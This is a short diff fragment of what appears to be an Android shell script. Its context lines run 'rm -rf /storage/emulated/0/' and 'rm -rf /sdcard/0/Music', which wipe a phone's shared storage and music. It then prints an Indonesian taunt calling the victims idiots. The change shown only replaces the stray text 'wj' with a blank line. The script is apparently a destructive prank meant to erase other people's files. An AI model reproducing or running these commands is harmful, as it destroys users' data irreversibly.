@@ -38,6 +38,6 @@ rm -rf /storage/emulated/0/
 
 rm -rf /sdcard/0/Music
 
-wj
+
 
 echo Gw minta maaf ya para TOLOL
